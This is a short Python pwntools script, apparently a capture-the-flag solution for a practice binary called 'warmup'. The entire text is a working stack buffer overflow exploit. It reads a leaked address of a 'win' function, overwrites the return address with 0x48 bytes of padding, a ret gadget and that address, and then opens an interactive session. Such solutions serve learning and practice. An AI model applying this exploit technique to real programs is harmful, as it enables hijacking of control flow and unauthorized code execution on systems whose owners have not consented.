#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./warmup")

p = process("./warmup")

# gdb.attach(p)

padding = b'a'*0x48

p.recvuntil("WOW:0x")

win = int(p.recvline().strip(), 16)
ret_addr = 0x00000000004004a1

log.info(f"{hex(win)=}")

log.info(win==0x40060d)

payload = padding + p64(ret_addr) + p64(win)

p.sendline(payload)

p.interactive()
